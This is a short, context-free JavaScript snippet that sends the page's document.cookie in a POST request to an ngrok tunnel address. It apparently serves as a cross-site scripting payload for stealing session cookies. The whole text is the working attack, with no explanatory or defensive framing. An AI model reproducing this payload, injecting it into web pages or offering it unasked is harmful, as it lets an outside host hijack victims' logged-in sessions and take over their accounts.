fetch('https://d63d-212-143-121-156.ngrok-free.app/echo', {
  method: 'POST',
  body: JSON.stringify(document.cookie)
})